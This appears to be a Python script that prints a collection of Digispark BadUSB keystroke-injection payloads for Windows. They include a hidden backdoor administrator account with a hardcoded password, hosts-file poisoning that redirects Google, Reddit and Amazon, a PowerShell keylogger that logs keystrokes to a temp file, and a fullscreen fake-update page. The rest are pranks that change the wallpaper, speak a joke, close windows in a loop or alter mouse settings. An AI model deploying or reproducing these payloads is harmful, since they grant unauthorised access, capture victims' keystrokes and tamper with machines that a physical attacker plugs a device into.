def Create_Account():
    # create account code
    print("""
    
    #include "DigiKeyboard.h"
    void setup() {
        DigiKeyboard.delay(1000);
        DigiKeyboard.sendKeyStroke(0);
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
        DigiKeyboard.delay(500);
        DigiKeyboard.print("cmd");
        DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
        DigiKeyboard.delay(1000);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(1000);
        DigiKeyboard.sendKeyStroke(KEY_ENTER);
        DigiKeyboard.delay(1000);
        DigiKeyboard.print(F("powershell $pass = ConvertTo-SecureString \"P@ssW0rD\" -AsPlainText -Force; New-LocalUser \"accName\" -Password $pass; Add-LocalGroupMember -Group \"Administrators\" -Member \"accName\" "));
        DigiKeyboard.sendKeyStroke(KEY_ENTER);
        DigiKeyboard.delay(500);
        /* I assumed user already have powershell - Try to hide the user account from the login screen*/
        DigiKeyboard.print(F("powershell New-Item -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\'\" -Name \"SpecialAccounts\" "));
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_ENTER);
        DigiKeyboard.print(F("powershell New-Item -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts'\" -Name \"UserList\" "));
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_ENTER);
        DigiKeyboard.print(F("powershell New-ItemProperty -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\'\" -Name \"accName\" -Value \"0\"  -PropertyType DWORD "));
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_ENTER);
        DigiKeyboard.delay(500);
        /* end hide user section */
        DigiKeyboard.print("exit");
        DigiKeyboard.sendKeyStroke(KEY_ENTER);
    }

    void loop() {
    }

    
""")


def DNS_Poisoner():
    print("""

        #include "DigiKeyboard.h"
        void setup() {
        }

        void loop() {
        DigiKeyboard.sendKeyStroke(0);
        //This opens an administrator command prompt
        DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
        DigiKeyboard.sendKeyStroke(KEY_A);
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
        DigiKeyboard.delay(500);
        //Adds the set websites & ips to the hosts file in windows, currently all redirect to dell
        DigiKeyboard.println("ECHO 143.166.83.38 www.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
        DigiKeyboard.println("ECHO 143.166.83.38 google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
        DigiKeyboard.println("ECHO 143.166.83.38 www.reddit.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
        DigiKeyboard.println("ECHO 143.166.83.38 reddit.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
        DigiKeyboard.println("ECHO 143.166.83.38 www.amazon.co.uk >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
        DigiKeyboard.println("ECHO 143.166.83.38 amazon.co.uk >> C:/SYSTEM32/DRIVERS/ETC/HOSTS");
        //clears dns cache
        DigiKeyboard.println("ipconfig /flushdns");
        //exits the terminal
        DigiKeyboard.println("exit");
        for(;;){ /*empty*/ }
        }
    
""")

def Keylogger():
    print("""
        #include "DigiKeyboard.h"
        void setup() {
            //empty
        }
        void loop() {
            // Open Powershell
            DigiKeyboard.sendKeyStroke(0);
            DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
            DigiKeyboard.delay(500);
            DigiKeyboard.print("powershell");
            DigiKeyboard.delay(500);
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(5000);

            // Write Keylogger Function
            DigiKeyboard.print(F("$code = {function My-Keypresses($Path=\"$env:temp\\mykeypress.txt\") \n{\n  $signatures = @\'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \npublic static extern short GetAsyncKeyState(int virtualKeyCode); \n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n\'@\n\n  $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru\n    \n  $null = New-Item -Path $Path -ItemType File -Force\n\n  try\n  {\n\n    while ($true) {\n      Start-Sleep -Milliseconds 40\n      \n      for ($ascii = 9; $ascii -le 254; $ascii++) {\n        $state = $API::GetAsyncKeyState($ascii)\n\n        if ($state -eq -32767) {\n          $null = [console]::CapsLock\n\n          $virtualKey = $API::MapVirtualKey($ascii, 3)\n\n          $kbstate = New-Object Byte[] 256\n          $checkkbstate = $API::GetKeyboardState($kbstate)\n\n          $mychar = New-Object -TypeName System.Text.StringBuilder\n\n          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)\n\n          if ($success) \n          {\n            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n          }\n        }\n      }\n    }\n  }\n  finally\n  {\n  }\n}}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j"));
            DigiKeyboard.delay(500);
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            for(;;){ /*empty*/ }
        }
""")

def Fake_update():
    print("""
        #include "DigiKeyboard.h"
        void setup() {
            //empty
        }

        void loop() {
            DigiKeyboard.delay(2000);
            DigiKeyboard.sendKeyStroke(0);
            DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
            DigiKeyboard.delay(3000);
            DigiKeyboard.print("http://fakeupdate.net/win10ue");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(2000);
            DigiKeyboard.sendKeyStroke(KEY_F11);
            for(;;){ /*empty*/ }
        }
""")


def Wallpaper_Changer():
    print("""
        #include "DigiKeyboard.h"
        void setup() {
        //empty
        }
        void loop() {
            DigiKeyboard.sendKeyStroke(0);
            DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
            DigiKeyboard.delay(500);
            DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
            DigiKeyboard.delay(500);
            DigiKeyboard.print("powershell");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(500);
            DigiKeyboard.print("$client = new-object System.Net.WebClient");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(500);
            DigiKeyboard.print("$client.DownloadFile(\"https://tr3.cbsistatic.com/hub/i/2014/05/15/f8964afd-bd82-4e0e-bcbe-e927363dcdc1/3b858e39e2cf183b878f54cad0073a67/codedoge.jpg\" , \"doge.jpg\")");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(500);
            DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\doge.jpg\" /f");
            DigiKeyboard.delay(500);
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(500);
            DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(500);
            DigiKeyboard.print("exit");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            for(;;){ /*empty*/ }
        }
""")


def Talker():
    print("""
        #include "DigiKeyboard.h"
        void setup() {
        }

        void loop() {
            DigiKeyboard.sendKeyStroke(0);
            DigiKeyboard.delay(100);
            DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
            DigiKeyboard.delay(100);
            DigiKeyboard.print("powershell");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(3000);
            DigiKeyboard.print("Add-Type -AssemblyName System.speech");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(100);
            DigiKeyboard.print("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(100);
            //Uncomment these lines to use a female voice
            //DigiKeyboard.print("$speak.SelectVoice('Microsoft Zira Desktop')");
            //DigiKeyboard.sendKeyStroke(KEY_ENTER);
            //DigiKeyboard.delay(500);
            DigiKeyboard.print("$speak.Speak(\"Here's a joke. Why do Java programmers wear glasses? Because they can't C#.\")");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(100);
            DigiKeyboard.print("exit");
            DigiKeyboard.sendKeyStroke(KEY_ENTER);
            DigiKeyboard.delay(100);
            DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
            DigiKeyboard.sendKeyStroke(KEY_N);
            for (;;) {
                /*empty*/
            }
        }
""")

def Window_Jammer():
    print("""
        #include "DigiKeyboard.h"
        void setup() {
        }

        void loop() {
        DigiKeyboard.sendKeyStroke(0);
        DigiKeyboard.delay(100);
        DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT);
        DigiKeyboard.delay(100);
        DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
        }
""")

def silly_mouse():
    print("""
    #include "DigiKeyboard.h"
    void setup() {
        #define KEY_TAB 43
        #define KEY_ARROW_RIGHT 0x4F
    }

    void loop() {
        DigiKeyboard.sendKeyStroke(0);
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
        DigiKeyboard.delay(500);
        DigiKeyboard.print("main.cpl");
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_ENTER);
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_SPACE);
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_SPACE);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_SHIFT_LEFT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_ARROW_RIGHT);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_SPACE);
        DigiKeyboard.delay(200);
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.delay(500);
        DigiKeyboard.print("100");
        DigiKeyboard.delay(500);
        DigiKeyboard.sendKeyStroke(KEY_ENTER);
        for(;;){ /*empty*/ }
    }
""")
